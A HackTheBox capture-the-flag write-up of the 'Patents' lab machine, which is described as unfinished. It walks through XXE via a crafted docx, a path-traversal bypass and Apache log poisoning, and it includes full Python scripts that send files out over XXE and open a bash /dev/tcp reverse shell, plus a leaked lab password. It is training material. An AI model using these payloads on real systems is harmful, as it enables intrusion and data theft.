---
title: "HackTheBox - Patents"
categories: [HackTheBox, Hard]
tags: [Linux,Hard,Web,OSWE]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:01:56.png
---


Patents was a good box. Not the best I did, but a good practice. It has a web page where you can upload a docx file. It's being parsed, so you can get XEE with it and read files in the server. After geting a config file from the server, we find a webpage that is vulnerable to directory path-transversal. Using the directory-traversal we can use apache log poisoning to get a shell in the context of www-data.

The auto shell for the www-data user is in the body of the post.

This box is not completed. Return here later to finish the buffer overflow part.

# Diagram

Not complete yet, I'll return here latter and get it all.

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.173
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:49:25.png)

## Port 80

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:46:27.png)

In upload.html we see a place where we can upload .docx files

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:47:20.png)

It's always interesing look for upload places, because most time the vulnerability is in it's kind of mechanims

We download a [file-sample](https://file-examples-com.github.io/uploads/2017/02/file-sample_1MB.docx)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:50:52.png)

And just upload it on the server, it makes the docx one pdf... Ok, file parsing

### Gobuster

Let's start crafting a little more on the box to see if we can enum more things do explore

```sh
gobuster dir -u http://10.10.10.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

We found a bunch of directories in it. Fine.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:11:48.png)

We run gobuster again on the `release` folder

```sh
gobuster dir -u http://10.10.10.173/release -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:15:28.png)

And found something interesting on this file

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:16:24.png)

Seems that it's performing entity parsing, which is very common in XEE attacks.

Possibly the injection point will be this docx file we can upload on the website.

What we will do?

First, we create an empty DOCX file with a custom XML part. Note that the XML must be valid. Inject XXE payload. Upload to test. Repeat step 2 for different payloads.

## XEE Attack

Ok, let's procced

We see the following line on the UpdateDetails

```
enabled entity parsing in custom folder
```

Seems that all files in custom folder is being parsed. But what is this custom folder? It refer to the customXml folder at the root of a .docx file's structure once unzipped.

It's not standard for docx files, we will need to at it manually

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:32:46.png)

We see many ways to make it, for example [this](https://blogs.sap.com/2017/04/24/openxml-in-word-processing-custom-xml-part-mapping-flat-data/)

I just added a folder called `customXml` with a file `item1.xml` in it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:38:08.png)

The item1.xml is a simple xxe payload

```xml
<?xml version="1.0" ?>
<!DOCTYPE xxe [
<!ENTITY % ext SYSTEM "http://10.10.14.20/test">
  %ext;
]>
<xxe></xxe>
```

We zip it again

```sh
zip -r ../xxe.docx *
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:39:19.png)

And we upload to the server with a python web server opened on port 80

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:25:02.png)

And it reaches our box

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2008:24:56.png)

## File Read Via XEE

What I usually do when I'm exploring XEE is the hability to read files in this vuln. I tried many kind of simple payloads to get the files read on the server, but no one worked well

Se tudo der certo, o parser deve vir buscar na minha Kali o wrapper.dtd. Será criada a entitidade, o %start vai ser modificado com <![CDATA[]]>, o %file com o tomcat-users.xml e o %end com o >]], que fecha o CDATA.

If everything goes ok, the parser shold come to my Kali box and get the wrapper.dtd. Then it'll create the entity

We create a wrapper file. Then the server could come to me and get this file, then process the request I got from the file.

wrapper.dtd
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % file "<!ENTITY exfil SYSTEM 'http://10.10.14.20/DATA?%data;'>">
```

file1.xml
```xml
<?xml version="1.0" ?>
<!DOCTYPE xxe [
<!ENTITY % ext SYSTEM "http://10.10.14.20/wrapper.dtd">
  %ext;
  %file;
]>
<xxe>&exfil;</xxe>
```

We create the smallets file I could

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:35:43.png)

And it worked as expected

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2009:36:18.png)

Let's automate the whole things now!

# Auto XEE LFI

We will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:30:40.png)


```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE LFI - Patents HackTheBox

import argparse
import requests
import sys
import os
import re
import base64
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Function to just prepare the folders docx
def prepareDoc(lhost):
    print("[+] Let's prepare the folders to be ziped ! [+]")
    os.system("mkdir Doc")
    os.system("mkdir Doc/customXml")
    os.system("mkdir Doc/word")
    # Create the files and the item1.xml
    document = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" mc:Ignorable="w14 wp14"><w:body><w:p><w:pPr><w:pStyle w:val="Normal"/><w:bidi w:val="0"/><w:jc w:val="left"/><w:rPr></w:rPr></w:pPr><w:r><w:rPr></w:rPr><w:t xml:space="preserve"> </w:t></w:r></w:p><w:sectPr><w:type w:val="nextPage"/><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134" w:footer="0" w:bottom="1134" w:gutter="0"/><w:pgNumType w:fmt="decimal"/><w:formProt w:val="false"/><w:textDirection w:val="lrTb"/></w:sectPr></w:body></w:document>'''
    f = open("Doc/word/document.xml", "w")
    f.write(document)
    f.close()
    # item1.xml
    payload = '<?xml version="1.0" ?>\n'
    payload += '<!DOCTYPE xxe [\n'
    payload += '<!ENTITY % ext SYSTEM "http://' + lhost + '/wrapper.dtd">\n'
    payload += '  %ext;\n'
    payload += '  %file;\n'
    payload += ']>\n'
    payload += '<xxe>&exfil;</xxe>' 
    f = open("Doc/customXml/item1.xml", "w")
    f.write(payload)
    f.close()
    print("[+] Folders structude done ! [+]")
    os.system("cd Doc; zip -r ../xee.docx *")
    print("[+] XEE.DOCX CREATED !! [+]")

# Create the wrapper which will iterate trought the file name
def createWrapper(lhost,file):
    payload = '''<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=''' + file + '">\n'
    payload += '''<!ENTITY % file "<!ENTITY exfil SYSTEM 'http://''' + lhost + ''':9999/%data;'>">'''
    f = open("wrapper.dtd", "w")
    f.write(payload)
    f.close()

# Function to upload the zip file
def uploadZip(rhost):
    url = "http://%s:80/convert.php" %rhost
    multipart_data = {
        'userfile': ('xee.doc', open('xee.docx', 'rb'), "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        'submit' : (None,"Generate pdf")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)

# Just b64 decode
def b64d(s):
    return base64.b64decode(s).decode()

# Function to just read the get.txt file and convert it
def readFile():
    f = open('get.txt','r')
    output= f.read()
    if len(output) < 5:
        print("[+] File does not exist or I can't read it!! ")
    else:
        b64encoded = re.search(' .* ', output).group(0)
        b64encoded = b64encoded.removeprefix(" /")
        print()
        print(b64d(b64encoded))

# Function to read the xee
def xeeLFI(lhost,rhost):
    prepareDoc(lhost)
    prefix = "Reading file: "
    file = ""
    while True:
        file = input(prefix)
        if file != "exit":
            createWrapper(lhost,file)
            os.system('nc -q 3 -lnvp 9999 > get.txt 2>/dev/null &')
            os.system("sleep 2")
            uploadZip(rhost)
            os.system("sleep 2")
            readFile()
        else:
            print("[+] Exitttttting..... !!!! [+]")
            break

# Let's clean the files created
def cleanMess():
    os.system("rm -r Doc")
    os.system("rm get.txt")
    os.system("rm xee.docx")
    os.system("rm wrapper.dtd")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local IP Address', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.localip

    '''Here we call the functions'''
    # Set up the web python server
    webServer()
    # Loop files
    xeeLFI(lhost,rhost)
    # Clean the files
    cleanMess()

if __name__ == '__main__':
    main()
```

Let'ss procced our enumeration.

We found a `config.php` file, which gobuster gave me the hint before. Is always good to look at config files

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:37:07.png)

Sounds good!

Accessing it we see:

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:38:56.png)

So, let's try it out

# Path Trasversal - Poison - RCE

When I saw this kind of stuff, the first thing comes to my mind is Path Transversal, I tested some standard payloads, but nothing returned

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:51:33.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:53:09.png)

I found this [article](https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki) which use Mangle Paterns to bypass Path Trasnversal Filtering

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:57:59.png)

And it worked!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2010:58:20.png)

Ok. After researching a while we found a way to make a log poison on the apache log file `/var/log/apache2/access.log`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2011:02:36.png)

And it includes the USER-AGENT of the request. So we can poison it with a simple PHP RCE

```php
User-Agent: <?php system($_REQUEST['cmd']); ?>
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2011:10:46.png)

And we have RCE!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2011:11:25.png)

And we have reverse shell!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2012:39:09.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2012:39:17.png)

And now, let's automate it!

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2012:53:40.png)

www-data_rev.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# www-data Auto Reverse Shell - Patents - HackTheBox

import argparse
import requests
import sys
import base64
import urllib.parse
import socket, telnetlib
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Function to poison the apache log
def poisonLOG(rhost):
    print("[+] Let's Poison the LOG !!! [+]")
    url = "http://%s:80/convert.php" %rhost
    headers = {"User-Agent": "<?php system($_REQUEST['cmd']); ?>", "Content-Type": "multipart/form-data; boundary=aaa"}
    data = "--aaa\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"xee.doc\"\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\nPK\x03\x04\r\n\r\n--aaa\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nGenerate pdf\r\n--dc7b6d9099c45960b210c01f3b72bebb--\r\n"
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] LOG Poisoned !!! [+]")
    
def getReverse(rhost,lhost,lport):
    print("[+] Now Let's get the reverse shell! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    message_bytes = reverse.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    payload = {
    'cmd': 'echo ' + base64_message + '|base64 -d | bash'
}
    payload_str = urllib.parse.urlencode(payload, safe='|')
    url = "http://%s:80/getPatent_alphav1.0.php?id=....//....//....//....//....//var/log/apache2/access.log&" %rhost
    r.get(url, params=payload_str, proxies=proxies, cookies=r.cookies)
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--lhost', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--lport', help='Local port', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.lhost
    lport = args.lport

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Poison the log
    poisonLOG(rhost)
    # Get the rev shell
    getReverse(rhost,lhost,lport)

if __name__ == '__main__':
    main()
```

Let's continue

# www-data --> root container

We download pspy to it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:02:31.png)

We run it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:07:11.png)

And one password come to us

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:08:01.png)

!gby0l0r0ck$$!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:10:07.png)

# root container --> root box

After some enum, we found a .git folder

```sh
find / -name .git 2>/dev/null
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:12:05.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:12:19.png)

We get the git folder in our kali box

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-24-HackTheBox-Patents/2021-10-24-HackTheBox-Patents%2001:17:06.png)

In this git folder there is a binary. I'll not explain how to explore it because of the lack time I have to solve this box. In the future I'll return here and do it better.

# Source Code Analysis

We transfer the source code of the web app to our box, to better analyse it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-07-09-HackTheBox-Patents/2021-07-09-HackTheBox-Patents%2002:05:23.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-07-09-HackTheBox-Patents/2021-07-09-HackTheBox-Patents%2002:07:21.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-07-09-HackTheBox-Patents/2021-07-09-HackTheBox-Patents%2002:08:42.png)

This is the `getPatent_alphav1.0.php` file

We can see where the filter of the path transversal is being applied!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-07-09-HackTheBox-Patents/2021-07-09-HackTheBox-Patents%2002:11:41.png)

This is the `convert.php` file

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-07-09-HackTheBox-Patents/2021-07-09-HackTheBox-Patents%2002:19:35.png)

Here we see where probably the problem is occurring

```php
try {
    $document = new Gears\Pdf($uploadfile);
    $document->save($pdfOut);
```

We see it load some modules on the top of the file

```php
require __DIR__ . '/vendor/autoload.php';
use Gears; 
include('config.php');
$uploaddir = 'uploads/';
```

We get the gears folder on /vendor, possibly where it's being renderized. I did not find properly on the code where it's being parsed.